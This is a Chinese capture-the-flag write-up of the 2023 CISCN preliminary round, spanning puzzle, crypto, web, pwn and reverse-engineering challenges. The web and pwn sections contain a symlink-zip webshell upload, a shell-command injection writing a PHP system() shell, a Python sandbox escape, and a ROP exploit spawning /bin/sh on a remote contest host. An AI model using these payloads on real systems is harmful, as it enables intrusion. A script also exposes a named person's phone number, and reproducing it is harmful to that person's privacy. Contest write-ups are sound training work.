# 2023 CISCN 第十六届全国大学生信息安全竞赛 初赛 WriteUp

![](https://image.3001.net/images/20230731/1690771023_64c71e4faab405a6f2e94.png!small)

## 引言

>  **第十六届全国大学生信息安全竞赛**
>
>  **——创新实践能力赛**
>
> <http://www.ciscn.cn/competition/securityCompetition?compet_id=38>

时光荏苒，又是一年一度的国赛了！

这篇 writeup 是 xdlddw 战队的队友一起写的，非常感谢队友带喵喵进了分区赛！Orz

（转眼已经是第四年打国赛了捏，这回大概率是最后一年打国赛了

> 感兴趣的话，可以回顾一下往年写的一点 writeup （有的貌似懒得写了
>
> [CTF | 2022 CISCN 初赛
> WriteUp](https://miaotony.xyz/2022/05/31/CTF_2022CISCN_preliminary/?utm_source=secin)
>
> [CTF | 2021 CISCN初赛 Misc
> WriteUp](https://miaotony.xyz/2021/05/25/CTF_2021CISCN_preliminary/?utm_source=secin)
>
> [CTF | 2020 CISCN 国赛总决赛
> 部分解题复现](https://miaotony.xyz/2020/10/06/CTF_2020CISCN_final/?utm_source=secin)
>
> [CTF | 2020 CISCN初赛 Z3&LFSR
> WriteUp](https://miaotony.xyz/2020/08/27/CTF_2020CISCN_preliminary/?utm_source=secin)

## Misc

### 签到卡

首先试图查看 `__builtins__`

![](https://image.3001.net/images/20230731/1690771024_64c71e503bfc4d143b84b.png!small)

发现也只能显示一行，试试看 open 能不能用：

![](https://image.3001.net/images/20230731/1690771024_64c71e50be8eaf730f27e.png!small)

确实可以用，接下来猜测 flag 的位置，通常在 `/flag`，直接构造`print(open('/flag').read())`，输入打孔卡片得到结果：

![](https://image.3001.net/images/20230731/1690771025_64c71e51471ac34e68fd4.png!small)

（作为一个和 IBM Mainframe 打了三年交道的学生，能用 80 列卡片跑 Python 的 IBM 360 还是头一次见。）

### 国粹

先观察图像的宽度，发现可以被 53 整除。用 opencv 切割图像，并将 `a.png`和 `k.png`中的麻将对应到整数：

![](https://image.3001.net/images/20230731/1690771025_64c71e51d5002cc71f187.png!small)

按 `a.png`中的麻将分组，可以观察到每个 a 中的麻将对应的多个 k 中的麻将，且都不重复。考虑到 a 的顺序，疑似是 a 和 k 的二维图像，沿着
a 行扫描，且预估是二维码，故而画出对应的图像：

![](https://image.3001.net/images/20230731/1690771026_64c71e5247c772583dcbd.png!small)

得到 `flag{202305012359}`

部分脚本如下：

    
    
    import cv2 as cv
    import matplotlib.pyplot as plt
    import numpy as np
    import hashlib
    
    H = 73
    W = 53
    
    majiang = cv.imread('题目.png')
    print(majiang.shape)
    
    l = [[], []]
    for i in range(majiang.shape[0] // H):
        for j in range(majiang.shape[1] // W):
            x0, x1 = j*W, (j+1)*W
            y0, y1 = i*H, (i+1)*H
            l[i].append(majiang[y0:y1,x0:x1])
          
    tokens = l[0]
    
    def token2no(t):
        for i, im in enumerate(tokens):
            f = np.reshape(t == im, (-1))
            if False in f:
                continue
            else:
                return i
        return None
    
    a = []
    a_img = cv.imread('a.png')
    
    print(a_img.shape)
    for j in range(a_img.shape[1] // W):
        x0, x1 = j*W, (j+1)*W
        y0, y1 = 0*H, (0+1)*H
        a.append(a_img[y0:y1,x0:x1])
    print(len(a))
    a_token = []
    for ai in a:
        a_token.append(token2no(ai))
    
    k = []
    k_img = cv.imread('k.png')
    
    print(k_img.shape)
    for j in range(k_img.shape[1] // W):
        x0, x1 = j*W, (j+1)*W
        y0, y1 = 0*H, (0+1)*H
        k.append(k_img[y0:y1,x0:x1])
    print(len(k))
    k_token = []
    for ki in k:
        k_token.append(token2no(ki))
    
    qrcode = [[0 for i in range(44)] for j in range(44)]
    for i,j in res:
        qrcode[i][j] = 1
    plt.imshow(qrcode)
    

### 被加密的生产流量

用 Wireshark 解包，发现工业上常用的 modbus 协议：

![](https://image.3001.net/images/20230731/1690771026_64c71e52a9b5e1a3f7be7.png!small)

只有 fc6 和 fc3 操作，查阅工业标准，发现：

![](https://image.3001.net/images/20230731/1690771027_64c71e536b0b80c32d5a1.png!small)

对于 fc3 操作，发现虽然返回的报文中的寄存器数量都是 5 ，但请求的报文中的寄存器数量都大的离谱：

![](https://image.3001.net/images/20230731/1690771027_64c71e53cf30ad367f8d8.png!small)

故而将这类包 dump 出来，编写脚本进行处理，将所有的寄存器数量导出，拼接起来：

![](https://image.3001.net/images/20230731/1690771028_64c71e543e48a51554379.png!small)

发现是 base32 编码，解码后即得到 `flag{c1f_fi1g_1000}`。

（期间有一个小插曲，由于每个 UINT16 可能是大端序或者小端序，所以需要尝试两次）

部分脚本如下：

    
    
    import json
    d = None
    with open('pkgs.json', 'r') as f:
        d = json.load(f)
    l = []
    for p in d:
        if "modbus.func_code" in p["_source"]["layers"]["modbus"]:
            m = p["_source"]["layers"]["modbus"]
            if len(m) == 3 and "modbus.word_cnt" in m and m["modbus.func_code"] == '3':
                mword = int(m["modbus.word_cnt"])
                lo = mword % 256
                hi = mword // 256
                l.append(hi)
                l.append(lo)
    l = bytes(l)
    
    from base64 import b32decode
    print(b32decode("MMYWMX3GNEYWOXZRGAYDA==="))
    

### pyshell

用 nc 连接服务，发现很多常见的 Python 技巧都无法使用。多次尝试后发现，长度超过 7 的输入都会直接返回 nop，且赋值无法使用。但 eval
可以使用。

这里使用 Python REPL 的特性，下划线表示上一次求值的结果，使用逐个字符拼接的方式将 eval 所需的字符串拼接出来，代码如下：

    
    
    def accustr(s):
        print(f"'{s[0]}'")
        for ch in s[1:]:
            print(f"_+'{ch}'")
          
    accustr('print(open("/flag").read())')
    

然后逐行执行，将 `_`调整为 eval 所需的字符串，随后执行：

    
    
    eval(_)
    

恰好 7 个字符，即得到 flag。

![](https://image.3001.net/images/20230731/1690771028_64c71e54a086ce184d7bb.png!small)

## Crypto

### 基于国密SM2算法的密钥密文分发

按照文档说明，使用 pypi 提供的 snowland-smx 和 sm4 进行操作，使用 postman 或 requests 库发送请求。

构造的解题脚本如下：

    
    
    from pysmx.SM2 import generate_keypair, Decrypt
    from sm4 import SM4Key
    from base64 import b16decode, b16encode
    import json
    import requests
    
    baseurl = "http://123.56.116.45:14847"
    
    # Gen A_PK, A_SK
    len_para = 64
    A_Public_Key, A_Private_Key = generate_keypair(len_para)
    print(len(A_Public_Key), b16encode(A_Public_Key))
    print(len(A_Private_Key), b16encode(A_Private_Key))
    
    
    # Login
    payload = json.dumps({
      "school": "同济大学",
      "name": "姜文渊",
      "phone": "18262803125"
    })
    headers = {
      'Content-Type': 'application/json'
    }
    response = requests.request("POST", baseurl+"/api/login", headers=headers, data=payload)
    uid = response.json()['data']['id']
    
    # Get B_PK, B_SK, C
    payload = json.dumps({
      "id": uid,
      "publicKey": b16encode(A_Public_Key).decode()
    })
    response = requests.request("POST", baseurl+"/api/allkey", headers=headers, data=payload)
    B_Public_Key = b16decode(response.json()['data']['publicKey'].upper())
    B_Private_Key_encrypted = b16decode(response.json()['data']['privateKey'].upper())
    C_encrypted =  b16decode(response.json()['data']['randomString'].upper())
    
    # Decrypt C
    C_decrypted = Decrypt(C_encrypted, A_Private_Key, 64)
    print(len(C_decrypted), b16encode(C_decrypted))
    
    # Decrypt B_SK
    sm4ckey = SM4Key(C_decrypted)
    B_Private_Key = sm4ckey.decrypt(B_Private_Key_encrypted)
    print(len(B_Private_Key), b16encode(B_Private_Key))
    
    # Get Quantum key
    payload = json.dumps({
      "id": uid
    })
    response = requests.request("POST", baseurl+"/api/quantum", headers=headers, data=payload)
    D_encrpted = b16decode(response.json()['data']['quantumString'].upper())
    
    # Decrypt Quantum key
    D_decrypted = Decrypt(D_encrpted, B_Private_Key, 64)
    print(len(D_decrypted), b16encode(D_decrypted).decode().lower())
    
    # Check
    payload = json.dumps({
      "id": uid,
      "quantumString": b16encode(D_decrypted).decode().lower()
    })
    response = requests.request("POST", baseurl+"/api/check", headers=headers, data=payload)
    
    # Get flag
    payload = json.dumps({
      "id": uid
    })
    response = requests.request("POST", baseurl+"/api/search", headers=headers, data=payload)
    print(response.json()['data']['flag'])
    

结果如下：

![](https://image.3001.net/images/20230731/1690771029_64c71e551c11170074a2f.png!small)

### 可信度量

题目上线后很快就有上百队做出来，故而考虑有显然的非预期解，首先尝试检查 shell 的环境变量无果，然后检查所有进程的环境变量，发现 flag 就在其中。

![](https://image.3001.net/images/20230731/1690771029_64c71e55c9e38fd1ac26d.png!small)

### Sign_in_passwd

下发的文件中有两行，第一行疑似 base64 编码，第二行疑似 url 编码。

将第二行解码后得到长度恰好为 64 的 base64 码表，送入 cyberchef 中即得到 flag。

![](https://image.3001.net/images/20230731/1690771030_64c71e565ff784c6d9247.png!small)

![](https://image.3001.net/images/20230731/1690771030_64c71e56c475034a1e103.png!small)

### bb84

起初看到下发的内容以为非 Windows 平台没法做，但是按照文档思路，执行对应的步骤，即可以进行解密。

值得注意的是，本题中的误码率没有起到很大的作用。

解题脚本如下：

    
    
    lines = []
    with open('info.csv', 'r') as f:
        l = f.readline()
        while l:
            lines.append(l.strip().split(','))
            l = f.readline()
    
    for l in lines:
        print(l[0], len(l))
    
    epc1 = [int(lines[0][i]) for i in range(1,len(lines[0]))]
    apd1 = [int(lines[1][i]) for i in range(1,len(lines[1]))]
    apd2 = [int(lines[2][i]) for i in range(1,len(lines[2]))]
    apd3 = [int(lines[3][i]) for i in range(1,len(lines[3]))]
    apd4 = [int(lines[4][i]) for i in range(1,len(lines[4]))]
    
    measurement = [(epc1[i], apd1[i], apd2[i], apd3[i], apd4[i]) for i in range(len(epc1))]
    
    def getpos(i):
        d = {
            (1,0,0,0):1,
            (0,1,0,0):2,
            (0,0,1,0):3,
            (0,0,0,1):4,
        }
        return d[i]
      
    def is_good_measure(m):
        return sum(m[1:]) == 1
    
    def is_good_base(m):
        k = getpos(m[1:])
        if (k in [1, 2]) and (m[0] in [1, 2]):
            return True
        if (k in [3, 4]) and (m[0] in [3, 4]):
            return True
        return False
    
    def is_good(m):
        return is_good_measure(m) and is_good_base(m)
    
    rawkeyseq = []
    for m in measurement:
        if is_good(m):
            rawkeyseq.append(1 if m[0] % 2 == 0 else 0)
    print(len(rawkeyseq))
    
    from base64 import b16encode, b16decode
    C = b16decode("D9F7E0F73787BF6C17D1D851221452212E9C952D3CF76FE8B0C70F326C03F5574D88FDE2F67ADDBA6E52")
    print(C)
    
    A = 1709
    B = 2003
    X0 = 17
    m = len(rawkeyseq)
    
    def next_lcg(x, a, b, m):
        return (a*x + b) % m
    
    keybits = []
    xc = X0
    for _ in range(len(C)*8):
        keybits.append(rawkeyseq[xc])
        xc = next_lcg(xc, A, B, m)
    print(len(keybits))
    
    key = []
    for i in range(len(keybits) // 8):
        d = 0
        for j in range(8):
            d += keybits[i*8 + j] * (1<<(7-j))
        key.append(d)
    key = bytes(key)
    print(len(key))
    ans = []
    for i in range(len(C)):
        ans.append(key[i] ^ C[i])
    ans = bytes(ans)
    print(ans)
    

即可得到 `flag{b3187851-16ee-4897-b9a4-0cf97fcf6863}`

## Web

### unzip

利用软链接，构造对应的压缩包，实现 `/tmp/hacker`-> `/var/www/html`。

    
    
    ln -s /var/www/html hacker
    zip -y hacker.zip hacker
    

上传 hacker.zip

在 hacker 目录下写入 shell.php，再次压缩

![](https://image.3001.net/images/20230731/1690771031_64c71e5732c4e105a36a6.png!small)

上传 hacker1.zip，此时木马已经写入了网站根目录

访问 hacker.php，实现 rce 读取 flag

### dumpit

分析猜测 dump 语句是直接系统命令执行，考虑拼接 shell 命令

使用 `-w`写入木马，`-r`指定文件

    
    
    ?db=ctf --tables flag1 -w "<?php system('env') ?>" -r a.php&table_2_dump=
    

直接访问 a.php 拿 flag

正常来说要提权，但是环境锅了可以直接读环境变量

![](https://image.3001.net/images/20230731/1690771031_64c71e579e42262ab32b4.png!small)

## Pwn

### 烧烤摊

1、分析源程序，发现通过输入负数可以提升自身的金额

2、承包商铺之后可以在改名的地方可以实现栈溢出

![](https://image.3001.net/images/20230731/1690771032_64c71e5821de58a9d1b34.png!small)

可以使用 ret2syscall，利用 ROPgadgets 来找到相应的寄存器操作，利用 memcpy 在 data 段写入 `'/bin/sh'`。

逻辑如下：买负数商品 -> 承包烧烤摊 -> 改名 -> ROP攻击

exp 如下：

    
    
    from pwn import *
    context(log_level='debug',os='linux',arch='amd64')
    
    # io = process("./shaokao")
    io = remote("123.56.251.120","42077")
    
    delim = b'>'
    io.sendlineafter(delim, b'1')
    
    delim = b'\xe6\xb6\xaf\x0a'
    io.sendlineafter(delim,b'1')
    
    delim = '？'.encode()
    io.sendlineafter(delim,b'-10000')
    
    delim = b'>'
    io.sendlineafter(delim,b'4')
    
    delim = b'5'
    io.sendlineafter(delim,b'5')
    
    delim = b'\x8d\xef\xbc\x9a\x0a'
    
    pop_rax_ret = 0x0458827
    pop_rdi_ret = 0x040264f
    pop_rsi_ret = 0x040a67e
    pop_rdx_rbx_ret = 0x04a404b
    bin_sh_addr = 0x04E60F0
    syscall_addr = 0x0402404
    
    payload = b'/bin/sh\x00' + b'a' * (0x20-0x8) + b'a' * 0x08 \
                + p64(pop_rax_ret) + p64(59) \
                + p64(pop_rdi_ret) + p64(bin_sh_addr) \
                + p64(pop_rsi_ret) + p64(0) \
                + p64(pop_rdx_rbx_ret) + p64(0) + p64(0) \
                + p64(syscall_addr)
    io.sendlineafter(delim, payload)
    io.interactive()
    

### funcanary

    
    
    def p():
        #a = process('./funcanary')
        a = remote('39.105.187.49', 13554)
        payload = b''
        for i in range(8):
            for b in range(256):
                a.sendafter(b'welcome\n', b'a' * 104 + payload + bytes([b]))
                l = a.recvline()
                if not b'stack' in l:
                    payload += bytes([b])
                    break
        for i in range(16):
            a.sendafter(b'welcome\n', b'a' * 104 + payload + b'a' * 8 + bytes([0x28, i * 16 + 2]))
            a.interactive()
    

## Rev

### babyRE

查看 xml 文件，发现是 Berkeley Snap，拖入 Snap 中尝试运行。双击动画播放后的锁图标，可以看到对应的代码块：

![](https://image.3001.net/images/20230731/1690771032_64c71e5884c89a2b34672.png!small)

分析后可以发现，加密方式是每个字符和前一个字符相 xor，

![](https://image.3001.net/images/20230731/1690771033_64c71e598cd0389ec3698.png!small)

单步执行，点击 secret 之后可以看到 secret 列表的内容，将 secret 手动输入到 Python 脚本中，并构建解题脚本如下：

    
    
    secret = [
        102, 10, 13, 6, 28, 74,
        3, 1, 3, 7, 85, 0,
        4, 75, 20, 92, 92, 8,
        28, 25, 81, 83, 7, 28,
        76, 88, 9, 0, 29, 73,
        0, 86, 4, 87, 87, 82,
        84, 85, 4, 85, 87, 30]
    len(secret)
    key = [0]
    for i in range(len(secret)):
        key.append(key[i] ^ secret[i])
    print(bytes(key[1:]))
    

## 知识问答

 **全部在通过认真学习视频获得**

2017年6月1日

每年至少一次

2018年

16个国家28次

NSA

酸狐狸

银河一号，1983

76

构建动态异构冗余架构

在数据上的完整性

## 小结

 **好卷啊！**

今年知识问答的部分改了形式，不过整了个先看视频再答题，终于不是那种政策知识的答题环节了，也不需要整个队伍每个人都做了，改成了整个队伍解题赛里的题目，有人做出来就行了。也算个好事。

不过还是想吐槽一下 i春秋 的比赛题目有点谜语人（

初赛这周末喵喵出去上课和考试了，没能在线下和队友一起看题，还要非常感谢队友的努力，带喵喵进了分区赛 Orz！

华东南分区赛线下见喵~

（可惜又是可恶的 AWDP 坐牢赛制捏

转眼已经是第四年打国赛了捏，这回大概率是喵喵最后一年打国赛了 （终于可以跑路了

